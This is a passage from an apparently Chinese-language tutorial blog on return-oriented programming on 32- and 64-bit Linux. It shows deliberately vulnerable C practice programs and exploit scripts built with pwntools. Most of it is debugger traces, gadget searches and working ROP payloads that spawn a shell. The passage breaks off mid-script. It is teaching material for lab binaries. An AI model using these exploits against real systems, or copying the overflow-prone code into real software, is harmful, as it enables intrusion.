class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">$ python level4_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x04/level2'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./level2'</span>: pid <span class="number">10140</span></span><br><span class="line">0x8048000 =&gt; 7f454c46</span><br><span class="line">[+] Loading <span class="keyword">from</span> <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x86/0x04/level2'</span>: <span class="number">0xf7ffd918</span></span><br><span class="line">0x804a004 =&gt; 18d9fff7</span><br><span class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: <span class="number">0xf7ffd918</span></span><br><span class="line">0x8049f14 =&gt; 01000000</span><br><span class="line">0x8049f1c =&gt; 0c000000</span><br><span class="line">0x8049f24 =&gt; 0d000000</span><br><span class="line">0x8049f2c =&gt; 19000000</span><br><span class="line">0x8049f34 =&gt; 1b000000</span><br><span class="line">0x8049f3c =&gt; 1a000000</span><br><span class="line">0x8049f44 =&gt; 1c000000</span><br><span class="line">0x8049f4c =&gt; f5feff6f</span><br><span class="line">0x8049f54 =&gt; 05000000</span><br><span class="line">0x8049f5c =&gt; 06000000</span><br><span class="line">0x8049f64 =&gt; 0a000000</span><br><span class="line">0x8049f6c =&gt; 0b000000</span><br><span class="line">0x8049f74 =&gt; 15000000</span><br><span class="line">0x8049f7c =&gt; 03000000</span><br><span class="line">0x8049f80 =&gt; 00a00408</span><br><span class="line">0xf7ffd928 =&gt; 00000000</span><br><span class="line">0xf7ffd91c =&gt; 04dcfff7</span><br><span class="line">0xf7ffdc04 =&gt; 00000000</span><br><span class="line">0xf7ffd924 =&gt; 08dcfff7</span><br><span class="line">0xf7ffdc0c =&gt; 74defff7</span><br><span class="line">0xf7ffde74 =&gt; 00000000</span><br><span class="line">0xf7ffdc14 =&gt; b031fdf7</span><br><span class="line">0xf7fd31b4 =&gt; 9031fdf7</span><br><span class="line">0xf7fd3190 =&gt; 2f6c6962</span><br><span class="line">0xf7fd3194 =&gt; 2f693338</span><br><span class="line">0xf7fd3198 =&gt; 362d6c69</span><br><span class="line">0xf7fd319c =&gt; 6e75782d</span><br><span class="line">0xf7fd31a0 =&gt; 676e752f</span><br><span class="line">0xf7fd31a4 =&gt; 6c696263</span><br><span class="line">0xf7fd31a8 =&gt; 2e736f2e</span><br><span class="line">0xf7fd31ac =&gt; 36000000</span><br><span class="line">0xf7fd31b0 =&gt; 0020e0f7</span><br><span class="line">[!] No ELF provided.  Leaking <span class="keyword">is</span> much faster <span class="keyword">if</span> you have a copy of the ELF being leaked.</span><br><span class="line">0xf7e02000 =&gt; 7f454c46</span><br><span class="line">0xf7fd31b8 =&gt; b03dfbf7</span><br><span class="line">0xf7e02004 =&gt; 01010103</span><br><span class="line">0xf7fb3db0 =&gt; 01000000</span><br><span class="line">0xf7fb3db8 =&gt; 0e000000</span><br><span class="line">0xf7fb3dc0 =&gt; 0c000000</span><br><span class="line">0xf7fb3dc8 =&gt; 19000000</span><br><span class="line">0xf7fb3dd0 =&gt; 1b000000</span><br><span class="line">0xf7fb3dd8 =&gt; 04000000</span><br><span class="line">0xf7fb3de0 =&gt; f5feff6f</span><br><span class="line">0xf7fb3de8 =&gt; 05000000</span><br><span class="line">0xf7fb3df0 =&gt; 06000000</span><br><span class="line">0xf7fb3df8 =&gt; 0a000000</span><br><span class="line">0xf7fb3e00 =&gt; 0b000000</span><br><span class="line">0xf7fb3e08 =&gt; 03000000</span><br><span class="line">0xf7fb3e0c =&gt; 0040fbf7</span><br><span class="line">0xf7e02010 =&gt; 03000300</span><br><span class="line">0xf7fb4004 =&gt; b031fdf7</span><br><span class="line">0xf7fd31c0 =&gt; 08dcfff7</span><br><span class="line">0xf7ffdc18 =&gt; 18d9fff7</span><br><span class="line">0xf7e02180 =&gt; 474e5500</span><br><span class="line">0xf7e02184 =&gt; dd5192a7</span><br><span class="line">0xf7e02188 =&gt; 69e33ed6</span><br><span class="line">0xf7e0218c =&gt; ca68a6ab</span><br><span class="line">0xf7e02190 =&gt; 5740ff9e</span><br><span class="line">0xf7e02194 =&gt; 8ec678a7</span><br><span class="line">[*] Trying lookup based on Build ID: dd5192a769e33ed6ca68a6ab5740ff9e8ec678a7</span><br><span class="line">[*] Skipping unavialable libc dd5192a769e33ed6ca68a6ab5740ff9e8ec678a7</span><br><span class="line">[*] .gnu.hash/.hash, .strtab <span class="keyword">and</span> .symtab offsets</span><br><span class="line">[*] Found DT_GNU_HASH at <span class="number">0xf7fb3de0</span></span><br><span class="line">0xf7fb3de4 =&gt; b821e0f7</span><br><span class="line">[*] Found DT_STRTAB at <span class="number">0xf7fb3de8</span></span><br><span class="line">0xf7fb3dec =&gt; 18f6e0f7</span><br><span class="line">[*] Found DT_SYMTAB at <span class="number">0xf7fb3df0</span></span><br><span class="line">0xf7fb3df4 =&gt; 285fe0f7</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">0xf7e021b8 =&gt; f3030000</span><br><span class="line">0xf7e021bc =&gt; 0a000000</span><br><span class="line">0xf7e021c0 =&gt; 00020000</span><br><span class="line">[*] hash chain index</span><br><span class="line">0xf7e03390 =&gt; b1050000</span><br><span class="line">[*] hash chain</span><br><span class="line">0xf7e05030 =&gt; 8ae4ee1c</span><br><span class="line">0xf7e0ba38 =&gt; 48310000</span><br><span class="line">0xf7e12760 =&gt; 73797374</span><br><span class="line">0xf7e12764 =&gt; 656d0074</span><br><span class="line">0xf7e0ba3c =&gt; a0ad0300</span><br><span class="line">system_addr= <span class="number">0xf7e3cda0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###sending payload2 ...###</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x02-linux-64与linux-86的区别"><a href="#0x02-linux-64与linux-86的区别" class="headerlink" title="0x02 linux_64与linux_86的区别"></a>0x02 linux_64与linux_86的区别</h3><p>linux_64与linux_86的区别主要有两点：首先是<code>内存地址</code>的范围由<code>32位变成了64位</code>。但是可以使用的内存地址<code>不能大于0x00007fffffffffff</code>，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的<code>前六个参数</code>依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p><p>我们还是拿实际程序做例子进行讲解,level3.c内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们<code>打开ASLR</code>并用如下方法编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fno-stack-protector level3.c -o level3</span><br></pre></td></tr></table></figure><p>通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到<code>callsystem()</code>这个函数的地址上即可。因为<code>程序本身</code>在内存中的<code>地址不是随机的</code>，所以不用担心函数地址发生改变。接下来就是要找溢出点了。我们还是用老方法生成一串定位字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$python</span> pattern.py create 150 &gt; payload</span><br><span class="line">$ cat payload </span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9</span><br></pre></td></tr></table></figure><p>然后运行<code>gdb ./level3</code>后输入这串字符串造成程序崩溃。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ gdb level3 </span><br><span class="line">pwndbg&gt; r &lt; payload </span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x64/0x01/level3 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x00000000004005e7 <span class="keyword">in</span> vulnerable_function ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x97</span><br><span class="line"> RBX  0x0</span><br><span class="line">*RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">*RDX  0x200</span><br><span class="line"> RDI  0x0</span><br><span class="line">*RSI  0x7fffffffdc50 ◂— 0x6141316141306141 (<span class="string">'Aa0Aa1Aa'</span>)</span><br><span class="line">*R8   0x400690 (__libc_csu_fini) ◂— ret    </span><br><span class="line">*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp</span><br><span class="line">*R10  0x37b</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x4004c0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">*R13  0x7fffffffddd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4134654133654132 (<span class="string">'2Ae3Ae4A'</span>)</span><br><span class="line">*RSP  0x7fffffffdcd8 ◂— 0x3765413665413565 (<span class="string">'e5Ae6Ae7'</span>)</span><br><span class="line">*RIP  0x4005e7 (vulnerable_function+32) ◂— ret    </span><br><span class="line">────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4005e7 &lt;vulnerable_function+32&gt;    ret    &lt;0x3765413665413565&gt;</span><br></pre></td></tr></table></figure><p>奇怪的事情发生了，<code>PC指针</code>并没有指向类似于<code>0x41414141</code>那样地址，而是停在了<code>vulnerable_function()</code>函数中。这是为什么呢？原因就是我们之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为<code>ret相当于“pop rip”</code>指令，所以我们只要看一下<code>栈顶的数值</code>就能知道PC跳转的地址了。其实上面已经可以看到了，这就是pwndbg的好处。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/gx <span class="variable">$rsp</span></span><br><span class="line">0x7fffffffdcd8:0x3765413665413565</span><br></pre></td></tr></table></figure><p>在GDB里，x是查看内存的指令，随后的gx代表数值用64位16进制显示。随后我们就可以用pattern.py来计算溢出点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python pattern.py offset 0x3765413665413565</span><br><span class="line">hex pattern decoded as: e5Ae6Ae7</span><br><span class="line">136</span><br></pre></td></tr></table></figure><p>可以看到<code>溢出点为136字节</code>。我们再构造一次payload，并且跳转到一个<code>小于0x00007fffffffffff</code>的地址，看看这次能否控制pc的指针。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "A"*136+"ABCDEF\x00\x00"'</span> &gt; payload</span><br><span class="line">$ cat payload </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF</span><br><span class="line">$ gdb level3 </span><br><span class="line">pwndbg&gt; r &lt; payload </span><br><span class="line">Starting program: /home/buffer/桌面/practice/ROP_x64/0x01/level3 &lt; payload</span><br><span class="line">Hello, World</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x0000464544434241 <span class="keyword">in</span> ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  0x91</span><br><span class="line"> RBX  0x0</span><br><span class="line">*RCX  0x7ffff7b04260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">*RDX  0x200</span><br><span class="line"> RDI  0x0</span><br><span class="line">*RSI  0x7fffffffdc50 ◂— 0x4141414141414141 (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">*R8   0x400690 (__libc_csu_fini) ◂— ret    </span><br><span class="line">*R9   0x7ffff7de7ab0 (_dl_fini) ◂— push   rbp</span><br><span class="line">*R10  0x37b</span><br><span class="line">*R11  0x246</span><br><span class="line">*R12  0x4004c0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">*R13  0x7fffffffddd0 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line">*RBP  0x4141414141414141 (<span class="string">'AAAAAAAA'</span>)</span><br><span class="line">*RSP  0x7fffffffdce0 —▸ 0x7fffffffdd0a ◂— 0x7fffffff</span><br><span class="line">*RIP  0x464544434241</span><br><span class="line">────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────</span><br><span class="line">Invalid address 0x464544434241</span><br></pre></td></tr></table></figure><p>可以看到我们已经<code>成功的控制了PC</code>的指针了。所以最终的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">p = process(<span class="string">'./level3'</span>)</span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)</span></span><br><span class="line">callsystem_addr = <span class="number">0x00000000004005b6</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">136</span></span><br><span class="line">payload += p64(callsystem_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>执行效果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python level1_exp.py </span><br><span class="line">[*] <span class="string">'/home/buffer/\xe6\xa1\x8c\xe9\x9d\xa2/practice/ROP_x64/0x01/level3'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./level3'</span>: pid 10522</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Hello, World</span><br><span class="line">$ whoami</span><br><span class="line">buffer</span><br></pre></td></tr></table></figure><h3 id="0x03使用工具寻找gadgets"><a href="#0x03使用工具寻找gadgets" class="headerlink" title="0x03使用工具寻找gadgets"></a>0x03使用工具寻找gadgets</h3><p>我们之前提到x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9寄存器里，如果还有<code>更多的参数</code>的话才会<code>保存在栈上</code>。所以我们需要寻找一些类似于<code>pop rdi; ret</code>的这种<code>gadget</code>。如果是简单的gadgets，我们可以通过<code>objdump</code>来查找。但当我们打算寻找一些复杂的gadgets的时候，还是借助于一些<code>查找gadgets的工具</code>比较方便。比较有名的工具有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ROPEME: https://github.com/packz/ropeme</span><br><span class="line">Ropper: https://github.com/sashs/Ropper</span><br><span class="line">ROPgadget: https://github.com/JonathanSalwan/ROPgadget/tree/master</span><br><span class="line">rp++: https://github.com/0vercl0k/rp</span><br></pre></td></tr></table></figure><p>这些工具功能上都差不多，找一款自己能用的惯的即可。</p><p>下面我们结合例子来讲解，首先来看一下目标程序<code>level4.c</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">systemaddr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* handle = dlopen(<span class="string">"libc.so.6"</span>, RTLD_LAZY);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,dlsym(handle,<span class="string">"system"</span>));</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    systemaddr();</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector level4.c -o level4 -ldl</span><br></pre></td></tr></table></figure><p>首先目标程序会<code>打印system()</code>在<code>内存中的地址</code>，这样的话就不需要我们考虑<code>ASLR</code>的问题了，只需要想办法触发buffer overflow然后<code>利用ROP执行system(“/bin/sh”)</code>。但为了调用system(“/bin/sh”)，我们需要找到一个gadget将<code>rdi</code>的值指向<code>“/bin/sh”的地址</code>。于是我们使用<code>ROPGadget</code>搜索一下level4中所有<code>pop ret</code>的gadgets。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget  --binary level4 --only <span class="string">"pop|ret"</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004008ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008ae : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008b0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008b2 : pop r15 ; ret</span><br><span class="line">0x00000000004008ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008af : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400700 : pop rbp ; ret</span><br><span class="line">0x00000000004008b3 : pop rdi ; ret</span><br><span class="line">0x00000000004008b1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004008ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400601 : ret</span><br><span class="line">0x0000000000400682 : ret 0x2009</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure><p>结果并不理想，因为程序比较小，在目标程序中并不能找到<code>pop rdi; ret</code>这个gadget。怎么办呢？解决方案是寻找<code>libc.so</code>中的gadgets。因为程序本身会load libc.so到内存中并且会打印system()的地址。所以当我们找到gadgets后可以<code>通过system()</code>计算出<code>偏移量</code>后调用对应的gadgets。(我这里找到了，估计是ROPgadget版本不一样吧，但是不行，exp执行不了，还是libc.so里的可以)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget  --binary libc.so.6 --only <span class="string">"pop|ret"</span> | grep rdi</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br><span class="line">0x0000000000067499 : pop rdi ; ret 0xffff</span><br></pre></td></tr></table></figure><p>这次我们成功的找到了“pop rdi; ret”这个gadget了。也就可以构造我们的ROP链了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"\x00"</span>*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure><p>另外，因为我们<code>只需调用一次system()</code>函数就可以获取shell，所以我们也可以搜索<code>不带ret的gadgets</code>来构造ROP链。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget  --binary libc.so.6 --only <span class="string">"pop|call"</span> | grep rdi</span><br><span class="line">0x0000000000196aab : call qword ptr [rdi + rbp*2 + 0x7fa40000]</span><br><span class="line">0x000000000019ade3 : call qword ptr [rdi + rbx + 2]</span><br><span class="line">0x000000000007d8b0 : call qword ptr [rdi]</span><br><span class="line">0x0000000000023e56 : call rdi</span><br><span class="line">0x0000000000107419 : pop rax ; pop rdi ; call rax</span><br><span class="line">0x000000000010741a : pop rdi ; call rax</span><br></pre></td></tr></table></figure><p>通过搜索结果我们发现，<code>0x00000000000f4739 : pop rax ; pop rdi ; call rax</code>也可以完成我们的目标。首先将rax赋值为system()的地址，rdi赋值为“/bin/sh”的地址，最后再调用call rax即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"\x00"</span>*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr)</span><br></pre></td></tr></table></figure><p>所以说这两个ROP链都可以完成我们的目标，随便选择一个进行攻击即可。最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span 